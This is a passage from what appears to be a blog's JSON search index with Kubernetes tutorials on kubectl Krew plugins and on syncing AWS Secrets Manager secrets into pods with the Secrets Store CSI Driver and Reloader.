[\"ruzickap@mymac-k8s-1111111111\"]}} List the Kubernetes RBAC Roles/ClusterRoles used by a given User, ServiceAccount, or Group: kubectl rbac-tool lookup kube-prometheus SUBJECT | SUBJECT TYPE | SCOPE | NAMESPACE | ROLE +------------------------------------------+----------------+-------------+-----------------------+-------------------------------------------+ kube-prometheus-stack-grafana | ServiceAccount | ClusterRole | | kube-prometheus-stack-grafana-clusterrole kube-prometheus-stack-grafana | ServiceAccount | Role | kube-prometheus-stack | kube-prometheus-stack-grafana kube-prometheus-stack-kube-state-metrics | ServiceAccount | ClusterRole | | kube-prometheus-stack-kube-state-metrics kube-prometheus-stack-operator | ServiceAccount | ClusterRole | | kube-prometheus-stack-operator kube-prometheus-stack-prometheus | ServiceAccount | ClusterRole | | kube-prometheus-stack-prometheus Visualize Kubernetes RBAC relationships: kubectl rbac-tool visualize --include-namespaces ingress-nginx,external-dns --outfile \"${TMP_DIR}/rbac.html\" rbac-tool visualize resource-capacity This plugin provides an overview of resource requests, limits, and utilization in a Kubernetes cluster. Installation of the resource-capacity Krew plugin: kubectl krew install resource-capacity Display resource requests, limits, and utilization for nodes: kubectl resource-capacity --pod-count --util NODE CPU REQUESTS CPU LIMITS CPU UTIL MEMORY REQUESTS MEMORY LIMITS MEMORY UTIL POD COUNT * 1130m (29%) 400m (10%) 135m (3%) 1250Mi (27%) 5048Mi (110%) 2423Mi (53%) 29/220 ip-192-168-26-84.ec2.internal 515m (26%) 0m (0%) 72m (3%) 590Mi (25%) 2644Mi (116%) 1320Mi (57%) 16/110 ip-192-168-7-23.ec2.internal 615m (31%) 400m (20%) 64m (3%) 660Mi (29%) 2404Mi (105%) 1103Mi (48%) 13/110 List resource requests, limits, and utilization for pods: kubectl resource-capacity --pods --util NODE NAMESPACE POD CPU REQUESTS CPU LIMITS CPU UTIL MEMORY REQUESTS MEMORY LIMITS MEMORY UTIL * * * 1130m (29%) 400m (10%) 142m (3%) 1250Mi (27%) 5048Mi (110%) 2414Mi (53%) ip-192-168-26-84.ec2.internal * * 515m (26%) 0m (0%) 79m (4%) 590Mi (25%) 2644Mi (116%) 1315Mi (57%) ip-192-168-26-84.ec2.internal kube-system aws-node-79jc6 25m (1%) 0m (0%) 3m (0%) 0Mi (0%) 0Mi (0%) 32Mi (1%) ip-192-168-26-84.ec2.internal kube-system aws-node-termination-handler-hj8hm 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 12Mi (0%) ip-192-168-26-84.ec2.internal cert-manager cert-manager-777fbdc9f8-ng8dg 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 25Mi (1%) ip-192-168-26-84.ec2.internal cert-manager cert-manager-cainjector-65857fccf8-krpr9 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 22Mi (0%) ip-192-168-26-84.ec2.internal cert-manager cert-manager-webhook-54f9d96756-plv84 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 10Mi (0%) ip-192-168-26-84.ec2.internal kube-system coredns-7975d6fb9b-hqmxm 100m (5%) 0m (0%) 1m (0%) 70Mi (3%) 170Mi (7%) 16Mi (0%) ip-192-168-26-84.ec2.internal kube-system coredns-7975d6fb9b-jhzkw 100m (5%) 0m (0%) 2m (0%) 70Mi (3%) 170Mi (7%) 15Mi (0%) ip-192-168-26-84.ec2.internal kube-system ebs-csi-controller-8cc6766cf-nsk5r 60m (3%) 0m (0%) 3m (0%) 240Mi (10%) 1536Mi (67%) 61Mi (2%) ip-192-168-26-84.ec2.internal kube-system ebs-csi-node-mct6d 30m (1%) 0m (0%) 1m (0%) 120Mi (5%) 768Mi (33%) 22Mi (0%) ip-192-168-26-84.ec2.internal ingress-nginx ingress-nginx-controller-9d7cf6ffb-xcw5t 100m (5%) 0m (0%) 1m (0%) 90Mi (3%) 0Mi (0%) 84Mi (3%) ip-192-168-26-84.ec2.internal karpenter karpenter-6bd66c788f-xnc4s 0m (0%) 0m (0%) 11m (0%) 0Mi (0%) 0Mi (0%) 146Mi (6%) ip-192-168-26-84.ec2.internal kube-prometheus-stack kube-prometheus-stack-grafana-896f8645-6q9lb 0m (0%) 0m (0%) 8m (0%) 0Mi (0%) 0Mi (0%) 229Mi (10%) ip-192-168-26-84.ec2.internal kube-prometheus-stack kube-prometheus-stack-prometheus-node-exporter-m4k5m 0m (0%) 0m (0%) 3m (0%) 0Mi (0%) 0Mi (0%) 10Mi (0%) ip-192-168-26-84.ec2.internal kube-system kube-proxy-6rfnc 100m (5%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 12Mi (0%) ip-192-168-26-84.ec2.internal kube-system metrics-server-57bd7b96f9-nllnn 0m (0%) 0m (0%) 3m (0%) 0Mi (0%) 0Mi (0%) 20Mi (0%) ip-192-168-26-84.ec2.internal oauth2-proxy oauth2-proxy-87bd47488-v97kg 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 8Mi (0%) ip-192-168-7-23.ec2.internal * * 615m (31%) 400m (20%) 64m (3%) 660Mi (29%) 2404Mi (105%) 1099Mi (48%) ip-192-168-7-23.ec2.internal kube-prometheus-stack alertmanager-kube-prometheus-stack-alertmanager-0 200m (10%) 200m (10%) 1m (0%) 250Mi (10%) 50Mi (2%) 20Mi (0%) ip-192-168-7-23.ec2.internal kube-system aws-node-bg2hc 25m (1%) 0m (0%) 2m (0%) 0Mi (0%) 0Mi (0%) 34Mi (1%) ip-192-168-7-23.ec2.internal kube-system aws-node-termination-handler-s66vl 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 12Mi (0%) ip-192-168-7-23.ec2.internal kube-system ebs-csi-controller-8cc6766cf-6v668 60m (3%) 0m (0%) 2m (0%) 240Mi (10%) 1536Mi (67%) 55Mi (2%) ip-192-168-7-23.ec2.internal kube-system ebs-csi-node-zx7bk 30m (1%) 0m (0%) 1m (0%) 120Mi (5%) 768Mi (33%) 21Mi (0%) ip-192-168-7-23.ec2.internal external-dns external-dns-7fdb8769ff-dxpdn 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 21Mi (0%) ip-192-168-7-23.ec2.internal forecastle forecastle-58d7ccb8f8-hlsf5 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 5Mi (0%) ip-192-168-7-23.ec2.internal kube-prometheus-stack kube-prometheus-stack-kube-state-metrics-669bd5c594-vfznb 0m (0%) 0m (0%) 2m (0%) 0Mi (0%) 0Mi (0%) 13Mi (0%) ip-192-168-7-23.ec2.internal kube-prometheus-stack kube-prometheus-stack-operator-7f45586f68-9rz6j 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 24Mi (1%) ip-192-168-7-23.ec2.internal kube-prometheus-stack kube-prometheus-stack-prometheus-node-exporter-x5bhm 0m (0%) 0m (0%) 2m (0%) 0Mi (0%) 0Mi (0%) 10Mi (0%) ip-192-168-7-23.ec2.internal kube-system kube-proxy-gzqct 100m (5%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 13Mi (0%) ip-192-168-7-23.ec2.internal mailhog mailhog-6f54fccf85-dgbp2 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 4Mi (0%) ip-192-168-7-23.ec2.internal kube-prometheus-stack prometheus-kube-prometheus-stack-prometheus-0 200m (10%) 200m (10%) 25m (1%) 50Mi (2%) 50Mi (2%) 415Mi (18%) rolesum This plugin summarizes Kubernetes RBAC roles for specified subjects. Installation of the rbac-tool Krew plugin: kubectl krew install rolesum Show details for the karpenter ServiceAccount: kubectl rolesum --namespace karpenter karpenter rolesum screenshot stern A tool for multi-pod and multi-container log tailing in Kubernetes. Installation of the stern Krew plugin: kubectl krew install stern Check logs for all pods in the cert-manager namespace from the past hour: kubectl stern -n cert-manager . --tail 5 --since 1h --no-follow stern screenshot view-allocations This kubectl plugin lists resource allocations (CPU, memory, GPU, etc.) as defined in the manifests of nodes and running pods. Installation of the view-allocations Krew plugin: kubectl krew install view-allocations kubectl view-allocations --utilization view-allocations screenshot viewnode Viewnode displays Kubernetes cluster nodes along with their pods and containers. Installation of the viewnode Krew plugin: kubectl krew install viewnode kubectl viewnode --all-namespaces --show-metrics 29 pod(s) in total 0 unscheduled pod(s) 2 running node(s) with 29 scheduled pod(s): - ip-192-168-19-143.ec2.internal running 16 pod(s) (linux/arm64/containerd://1.6.20+bottlerocket | mem: 1.3 GiB) * cert-manager: cert-manager-777fbdc9f8-qhk2d (running | mem usage: 24.8 MiB) * cert-manager: cert-manager-cainjector-65857fccf8-t68lk (running | mem usage: 22.4 MiB) * cert-manager: cert-manager-webhook-54f9d96756-8nbqx (running | mem usage: 9.4 MiB) * ingress-nginx: ingress-nginx-controller-9d7cf6ffb-vtjhx (running | mem usage: 74.3 MiB) * karpenter: karpenter-79455db76f-79q7h (running | mem usage: 164.2 MiB) * kube-prometheus-stack: kube-prometheus-stack-grafana-896f8645-972n2 (running | mem usage: 232.2 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-rw9kh (running | mem usage: 8.0 MiB) * kube-system: aws-node-gfn9v (running | mem usage: 30.8 MiB) * kube-system: aws-node-termination-handler-fhcmv (running | mem usage: 11.9 MiB) * kube-system: coredns-7975d6fb9b-29885 (running | mem usage: 14.8 MiB) * kube-system: coredns-7975d6fb9b-mrfws (running | mem usage: 14.6 MiB) * kube-system: ebs-csi-controller-8cc6766cf-x5mb9 (running | mem usage: 55.3 MiB) * kube-system: ebs-csi-node-xtqww (running | mem usage: 21.2 MiB) * kube-system: kube-proxy-c97d8 (running | mem usage: 11.9 MiB) * kube-system: metrics-server-57bd7b96f9-mqnqq (running | mem usage: 17.7 MiB) * oauth2-proxy: oauth2-proxy-66b84b895c-8hv8d (running | mem usage: 6.8 MiB) - ip-192-168-3-70.ec2.internal running 13 pod(s) (linux/arm64/containerd://1.6.20+bottlerocket | mem: 940.6 MiB) * external-dns: external-dns-7fdb8769ff-hjsxr (running | mem usage: 19.6 MiB) * forecastle: forecastle-58d7ccb8f8-l9dfs (running | mem usage: 4.3 MiB) * kube-prometheus-stack: alertmanager-kube-prometheus-stack-alertmanager-0 (running | mem usage: 18.2 MiB) * kube-prometheus-stack: kube-prometheus-stack-kube-state-metrics-669bd5c594-jqcjb (running | mem usage: 12.2 MiB) * kube-prometheus-stack: kube-prometheus-stack-operator-7f45586f68-jfzhb (running | mem usage: 22.8 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-g7t7l (running | mem usage: 8.5 MiB) * kube-prometheus-stack: prometheus-kube-prometheus-stack-prometheus-0 (running | mem usage: 328.1 MiB) * kube-system: aws-node-termination-handler-hrjv8 (running | mem usage: 11.9 MiB) * kube-system: aws-node-vsr54 (running | mem usage: 30.8 MiB) * kube-system: ebs-csi-controller-8cc6766cf-69plv (running | mem usage: 53.0 MiB) * kube-system: ebs-csi-node-j6p6d (running | mem usage: 21.5 MiB) * kube-system: kube-proxy-d6wqx (running | mem usage: 10.5 MiB) * mailhog: mailhog-6f54fccf85-6s7bt (running | mem usage: 3.4 MiB) Show various details for the kube-prometheus-stack namespace: kubectl viewnode -n kube-prometheus-stack --container-block-view --show-containers --show-metrics --show-pod-start-times --show-requests-and-limits 7 pod(s) in total 0 unscheduled pod(s) 2 running node(s) with 7 scheduled pod(s): - ip-192-168-19-143.ec2.internal running 2 pod(s) (linux/arm64/containerd://1.6.20+bottlerocket | mem: 1.3 GiB) * kube-prometheus-stack-grafana-896f8645-972n2 (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 229.3 MiB) 3 container/s: 0: grafana (running) [cpu: - | mem: - | mem usage: 86.7 MiB] 1: grafana-sc-dashboard (running) [cpu: - | mem: - | mem usage: 70.6 MiB] 2: grafana-sc-datasources (running) [cpu: - | mem: - | mem usage: 72.0 MiB] * kube-prometheus-stack-prometheus-node-exporter-rw9kh (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 8.2 MiB) 1 container/s: 0: node-exporter (running) [cpu: - | mem: - | mem usage: 8.2 MiB] - ip-192-168-3-70.ec2.internal running 5 pod(s) (linux/arm64/containerd://1.6.20+bottlerocket | mem: 942.2 MiB) * alertmanager-kube-prometheus-stack-alertmanager-0 (running/Sat Jun 24 11:34:15 UTC 2023 | mem usage: 18.2 MiB) 2 container/s: 0: alertmanager (running) [cpu: - | mem: 200Mi&lt;- | mem usage: 15.6 MiB] 1: config-reloader (running) [cpu: 200m&lt;200m | mem: 50Mi&lt;50Mi | mem usage: 2.7 MiB] * kube-prometheus-stack-kube-state-metrics-669bd5c594-jqcjb (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 12.2 MiB) 1 container/s: 0: kube-state-metrics (running) [cpu: - | mem: - | mem usage: 12.2 MiB] * kube-prometheus-stack-operator-7f45586f68-jfzhb (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 22.5 MiB) 1 container/s: 0: kube-prometheus-stack (running) [cpu: - | mem: - | mem usage: 22.5 MiB] * kube-prometheus-stack-prometheus-node-exporter-g7t7l (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 8.7 MiB) 1 container/s: 0: node-exporter (running) [cpu: - | mem: - | mem usage: 8.7 MiB] * prometheus-kube-prometheus-stack-prometheus-0 (running/Sat Jun 24 11:34:20 UTC 2023 | mem usage: 328.1 MiB) 2 container/s: 0: config-reloader (running) [cpu: 200m&lt;200m | mem: 50Mi&lt;50Mi | mem usage: 6.0 MiB] 1: prometheus (running) [cpu: - | mem: - | mem usage: 322.0 MiB] There are a few other kubectl Krew plugins that I have looked at but am not currently using: aks, view-cert, cost, cyclonus, graph, ingress-nginx node-shell, nodepools, np-viewer, oomd, permissions, popeye, pv-migrate, score, ssh-jump, tree, unlimited, whoami Clean-up Remove files from the ${TMP_DIR} directory: for FILE in \"${TMP_DIR}\"/{krew-linux_amd64,rbac.html}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy ‚Ä¶ üòâ" }, { "title": "Secrets Store CSI Driver and Reloader", "url": "/posts/secrets-store-csi-driver-reloader/", "categories": "Kubernetes, Amazon EKS, secrets-store-csi-driver, Reloader, AWS Secrets Manager", "tags": "Amazon EKS, k8s, kubernetes, secrets-store-csi-driver, reloader, AWS Secrets Manager", "date": "2023-04-01 00:00:00 +0200", "content": "Sometimes it is necessary to store secrets in services like HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, or others, and then use them in Kubernetes. In this post, I would like to explore how to store secrets in AWS Secrets Manager, retrieve them using the Kubernetes Secrets Store CSI Driver with the AWS Secrets and Configuration Provider (ASCP), and then use them both as Kubernetes Secrets and as files mounted directly into pods. When a Secret is rotated and has been defined as an environment variable in the Pod specification (using secretKeyRef), it is necessary to refresh or restart the pod. This can be achieved using tools like Reloader. secrets-store-csi-driver architecture Links: Use AWS Secrets Manager secrets in Amazon Elastic Kubernetes Service How to use AWS Secrets &amp; Configuration Provider with your Kubernetes Secrets Store CSI driver Stakater Reloader docs Requirements An Amazon EKS cluster (as described in ‚ÄúCheapest Amazon EKS)‚Äù Helm The following variables are used in the subsequent steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Create secret in AWS Secrets Manager Use CloudFormation to create a Policy and Secrets in AWS Secrets Manager: cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/aws-secretmanager-secret.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Secret Manager and policy Parameters: ClusterFQDN: Description: \"Cluster FQDN. (domain for all applications) Ex: kube1.k8s.mylabs.dev\" Type: String Resources: SecretsManagerKuardSecretPolicy: Type: AWS::IAM::ManagedPolicy Properties: ManagedPolicyName: !Sub \"${ClusterFQDN}-SecretsManagerKuardSecret\" Description: !Sub \"Policy required by SecretsManager to access to Secrets Manager ${ClusterFQDN}-KuardSecret\" PolicyDocument: Version: \"2012-10-17\" Statement: - Sid: SecretActions Effect: Allow Action: - \"secretsmanager:GetSecretValue\" - \"secretsmanager:DescribeSecret\" Resource: !Ref SecretsManagerKuardSecret SecretsManagerKuardSecret: Type: AWS::SecretsManager::Secret Properties: Name: !Sub \"${ClusterFQDN}-KuardSecret\" Description: My Secret GenerateSecretString: SecretStringTemplate: \"{\\\"username\\\": \\\"admin123\\\"}\" GenerateStringKey: password PasswordLength: 16 ExcludePunctuation: true Outputs: SecretsManagerKuardSecretArn: Description: The ARN of the created Amazon SecretsManagerKuardSecret Secret Value: !Ref SecretsManagerKuardSecret SecretsManagerKuardSecretPolicyArn: Description: The ARN of the created SecretsManagerKuardSecret Policy Value: !Ref SecretsManagerKuardSecretPolicy EOF aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"ClusterFQDN=${CLUSTER_FQDN}\" \\ --stack-name \"${CLUSTER_NAME}-aws-secretmanager-secret\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-secretmanager-secret.yml\" Screenshot from AWS Secrets Manager: AWS Secrets Manager - Secrets - k01.k8s.mylabs.dev-KuardSecret Install Secrets Store CSI Driver and AWS Provider Install the secrets-store-csi-driver Helm chart and modify its default values: # renovate: datasource=helm depName=secrets-store-csi-driver registryUrl=https://kubernetes-sigs.github.io/secrets-store-csi-driver/charts SECRETS_STORE_CSI_DRIVER_HELM_CHART_VERSION=\"1.4.1\" helm repo add --force-update secrets-store-csi-driver https://kubernetes-sigs.github.io/secrets-store-csi-driver/charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-secrets-store-csi-driver.yml\" &lt;&lt; EOF syncSecret: enabled: true enableSecretRotation: true EOF helm upgrade --install --version \"${SECRETS_STORE_CSI_DRIVER_HELM_CHART_VERSION}\" --namespace secrets-store-csi-driver --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-secrets-store-csi-driver.yml\" secrets-store-csi-driver secrets-store-csi-driver/secrets-store-csi-driver Install the secrets-store-csi-driver-provider-aws Helm chart: # renovate: datasource=helm depName=secrets-store-csi-driver-provider-aws registryUrl=https://aws.github.io/secrets-store-csi-driver-provider-aws SECRETS_STORE_CSI_DRIVER_PROVIDER_AWS_HELM_CHART_VERSION=\"0.3.6\" helm repo add --force-update aws-secrets-manager https://aws.github.io/secrets-store-csi-driver-provider-aws helm upgrade --install --version \"${SECRETS_STORE_CSI_DRIVER_PROVIDER_AWS_HELM_CHART_VERSION}\" --namespace secrets-store-csi-driver --create-namespace --wait secrets-store-csi-driver-provider-aws aws-secrets-manager/secrets-store-csi-driver-provider-aws The necessary components are now ready. Install kuard Kuard is a simple application that can be used to display various pod details, created for the book ‚ÄúKubernetes: Up and Running‚Äù. Install Kuard, which will use the secrets from AWS Secrets Manager as a mountpoint and also as a Kubernetes Secret. SECRETS_MANAGER_KUARDSECRET_POLICY_ARN=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-aws-secretmanager-secret\" --query \"Stacks[0].Outputs[?OutputKey==\\`SecretsManagerKuardSecretPolicyArn\\`].OutputValue\" --output text) eksctl create iamserviceaccount --cluster=\"${CLUSTER_NAME}\" --name=kuard --namespace=kuard --attach-policy-arn=\"${SECRETS_MANAGER_KUARDSECRET_POLICY_ARN}\" --role-name=\"eksctl-${CLUSTER_NAME}-irsa-kuard\" --approve Create the SecretProviderClass. This object tells the AWS provider which secrets to mount in the pod. It will also create a Secret named kuard-secret that will be synchronized with the data stored in AWS Secrets Manager. kubectl apply -f - &lt;&lt; EOF apiVersion: secrets-store.csi.x-k8s.io/v1alpha1 kind: SecretProviderClass metadata: name: kuard-deployment-aws-secrets namespace: kuard spec: provider: aws parameters: objects: | - objectName: \"${CLUSTER_FQDN}-KuardSecret\" objectType: \"secretsmanager\" objectAlias: KuardSecret secretObjects: - secretName: kuard-secret type: Opaque data: - objectName: KuardSecret key: username EOF Install Kuard and use the previously created SecretProviderClass: kubectl apply -f - &lt;&lt; EOF kind: Service apiVersion: v1 metadata: name: kuard namespace: kuard labels: app: kuard spec: selector: app: kuard ports: - protocol: TCP port: 80 targetPort: 8080 --- apiVersion: apps/v1 kind: Deployment metadata: name: kuard-deployment namespace: kuard labels: app: kuard spec: replicas: 2 selector: matchLabels: app: kuard template: metadata: labels: app: kuard spec: serviceAccountName: kuard affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - topologyKey: \"kubernetes.io/hostname\" labelSelector: matchLabels: app: kuard volumes: - name: secrets-store-inline csi: driver: secrets-store.csi.k8s.io readOnly: true volumeAttributes: secretProviderClass: \"kuard-deployment-aws-secrets\" containers: - name: kuard-deployment # renovate: datasource=docker depName=gcr.io/kuar-demo/kuard-arm64 extractVersion=^(?&lt;version&gt;.+)$ image: gcr.io/kuar-demo/kuard-arm64:v0.9-green resources: requests: cpu: 10m memory: \"32Mi\" limits: cpu: 20m memory: \"64Mi\" ports: - containerPort: 8080 volumeMounts: - name: secrets-store-inline mountPath: \"/mnt/secrets-store\" readOnly: true env: - name: KUARDSECRET valueFrom: secretKeyRef: name: kuard-secret key: username --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: kuard namespace: kuard annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/kubernetes/kubernetes/d9a58a39b69a0eaec5797e0f7a0f9472b4829ab0/logo/logo_with_border.svg forecastle.stakater.com/appName: Kuard nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri labels: app: kuard spec: rules: - host: kuard.${CLUSTER_FQDN} http: paths: - path: / pathType: ImplementationSpecific backend: service: name: kuard port: number: 8080 tls: - hosts: - kuard.${CLUSTER_FQDN} EOF After the successful deployment of Kuard, you should see the credentials in the kuard-secret: kubectl wait --namespace kuard --for condition=available deployment kuard-deployment kubectl get secrets -n kuard kuard-secret --template=\"{{.data.username}}\" | base64 -d | jq { \"password\": \"rxxxxxxxxxxxxxxH\", \"username\": \"admin123\" } You should see similar log messages in the secrets-store-csi-driver pods: kubectl logs -n secrets-store-csi-driver daemonsets/secrets-store-csi-driver Found 2 pods, using pod/secrets-store-csi-driver-2k9jv I0416 12:17:32.553991 1 exporter.go:35] \"initializing metrics backend\" backend=\"prometheus\" I0416 12:17:32.555766 1 main.go:190] \"starting manager\\n\" I0416 12:17:32.656785 1 secrets-store.go:46] \"Initializing Secrets Store CSI Driver\" driver=\"secrets-store.csi.k8s.io\" version=\"v1.3.2\" buildTime=\"2023-03-20-21:09\" I0416 12:17:32.656834 1 reconciler.go:130] \"starting rotation reconciler\" rotationPollInterval=\"2m0s\" I0416 12:17:32.660649 1 server.go:121] \"Listening for connections\" address=\"//csi/csi.sock\" I0416 12:17:34.082277 1 nodeserver.go:365] \"node: getting default node info\\n\" I0416 12:18:54.990977 1 nodeserver.go:359] \"Using gRPC client\" provider=\"aws\" pod=\"kuard-deployment-756f6cd885-6mzrq\" I0416 12:18:56.015817 1 nodeserver.go:254] \"node publish volume complete\" targetPath=\"/var/lib/kubelet/pods/ba66d6a4-1def-4636-b67a-99ca929e9293/volumes/kubernetes.io~csi/secrets-store-inline/mount\" pod=\"kuard/kuard-deployment-756f6cd885-6mzrq\" time=\"1.128414837s\" I0416 12:18:56.016290 1 secretproviderclasspodstatus_controller.go:222] \"reconcile started\" spcps=\"kuard/kuard-deployment-756f6cd885-6mzrq-kuard-kuard-deployment-aws-secrets\" I0416 12:18:56.220255 1 secretproviderclasspodstatus_controller.go:366] \"reconcile complete\" spc=\"kuard/kuard-deployment-aws-secrets\" pod=\"kuard/kuard-deployment-756f6cd885-6mzrq\" spcps=\"kuard/kuard-deployment-756f6cd885-6mzrq-kuard-kuard-deployment-aws-secrets\" Go to these URLs and check the credentials synced from AWS Secrets Manager: https://kuard.k01.k8s.mylabs.dev/fs/mnt/secrets-store/ kubectl exec -i -n kuard deployments/kuard-deployment -- cat /mnt/secrets-store/KuardSecret {\"password\":\"rxxxxxxxxxxxxxxH\",\"username\":\"admin123\"} https://kuard.k01.k8s.mylabs.dev/-/env kubectl exec -i -n kuard deployments/kuard-deployment -- sh -c \"echo \\${KUARDSECRET}\" {\"password\":\"rxxxxxxxxxxxxxxH\",\"username\":\"admin123\"} After executing the commands above, the secret from AWS Secrets Manager is copied to the Kubernetes Secret (kuard-secret). It is also present as a file (/mnt/secrets-store/KuardSecret) and as an environment variable (KUARDSECRET) inside the pod. Rotate AWS Secret Let‚Äôs change/rotate the credentials inside the AWS Secret to see if the change will also be reflected in the Kubernetes objects: aws secretsmanager update-secret --secret-id \"k01.k8s.mylabs.dev-KuardSecret\" \\ --secret-string \"{\\\"user\\\":\\\"admin123\\\",\\\"password\\\":\\\"EXAMPLE-PASSWORD\\\"}\" sleep 200 After changing the password in AWS Secrets Manager, you should also see the change in the Kubernetes Secret and in the /mnt/secrets-store/KuardSecret file inside the pod: kubectl get secrets -n kuard kuard-secret --template=\"{{.data.username}}\" | base64 -d | jq { \"user\": \"admin123\", \"password\": \"EXAMPLE-PASSWORD\" } AWS Secrets Manager - Secrets - k01.k8s.mylabs.dev-KuardSecret kubectl exec -i -n kuard deployments/kuard-deployment -- cat /mnt/secrets-store/KuardSecret {\"user\":\"admin123\",\"password\":\"EXAMPLE-PASSWORD\"} The environment variable inside the pod will not be changed automatically: kubectl exec -i -n kuard deployments/kuard-deployment -- sh -c \"echo \\${KUARDSECRET}\" {\"password\":\"rxxxxxxxxxxxxxxH\",\"username\":\"admin123\"} The only way to update a pre-defined environment variable inside the pod is to restart the pod. Install Reloader to do rolling upgrades when Secrets get changed In the case of changes to the Secret (kuard-secret), a rolling upgrade should be performed on the Deployment (kuard-deployment) to ‚Äúrefresh‚Äù the environment variables. It is time to use Reloader, which can perform this action automatically. Install the reloader Helm chart: # renovate: datasource=helm depName=reloader registryUrl=https://stakater.github.io/stakater-charts RELOADER_HELM_CHART_VERSION=\"1.0.69\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-reloader.yml\" &lt;&lt; EOF reloader: readOnlyRootFileSystem: true podMonitor: enabled: true EOF helm upgrade --install --version \"${RELOADER_HELM_CHART_VERSION}\" --namespace reloader --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-reloader.yml\" reloader stakater/reloader You need to annotate the kuard deployment to enable Pod rolling upgrades: kubectl annotate -n kuard deployment kuard-deployment 'reloader.stakater.com/auto=true' Let‚Äôs perform the credential change one more time: aws secretsmanager update-secret --secret-id \"k01.k8s.mylabs.dev-KuardSecret\" \\ --secret-string \"{\\\"user\\\":\\\"admin123\\\",\\\"password\\\":\\\"EXAMPLE-PASSWORD-2\\\"}\" sleep 400 Screenshot from AWS Secrets Manager: AWS Secrets Manager - Secrets - k01.k8s.mylabs.dev-KuardSecret After some time, changes are detected in the kuard-secret secret, and the pods are restarted: kubectl logs -n reloader deployments/reloader-reloader reloader-reloader time=\"2023-04-17T18:08:57Z\" level=info msg=\"Environment: Kubernetes\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"Starting Reloader\" time=\"2023-04-17T18:08:57Z\" level=warning msg=\"KUBERNETES_NAMESPACE is unset, will detect changes in all namespaces.\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"created controller for: configMaps\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"Starting Controller to watch resource type: configMaps\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"created controller for: secrets\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"Starting Controller to watch resource type: secrets\" time=\"2023-04-17T18:12:17Z\" level=info msg=\"Changes detected in 'kuard-secret' of type 'SECRET' in namespace 'kuard', Updated 'kuard-deployment' of type 'Deployment' in namespace 'kuard'\" After the pods reload, the environment variable KUARDSECRET should contain the updated value: kubectl exec -i -n kuard deployments/kuard-deployment -- sh -c \"echo \\${KUARDSECRET}\" {\"user\":\"admin123\",\"password\":\"EXAMPLE-PASSWORD-2\"} It is possible to use and synchronize credentials from AWS Secrets Manager to the following locations within a pod: A file inside the pod A Kubernetes Secret An environment variable inside the pod To clean up the environment, delete the IRSA, remove the CloudFormation stack, and delete the namespace: if eksctl get iamserviceaccount --cluster=\"${CLUSTER_NAME}\" --name=kuard --namespace=kuard; then eksctl delete iamserviceaccount --cluster=\"${CLUSTER_NAME}\" --name=kuard --namespace=kuard fi aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-aws-secretmanager-secret\" Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{aws-secretmanager-secret,helm_values-{reloader,secrets-store-csi-driver}}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy ‚Ä¶ üòâ" }, { "title": "Velero and cert-manager", "url": "/posts/velero-and-cert-manager/", "categories": "Kubernetes, Amazon EKS, Velero, cert-manager", "tags": "Amazon EKS, k8s, kubernetes, velero, cert-manager, certificates", "date": "2023-03-20 00:00:00 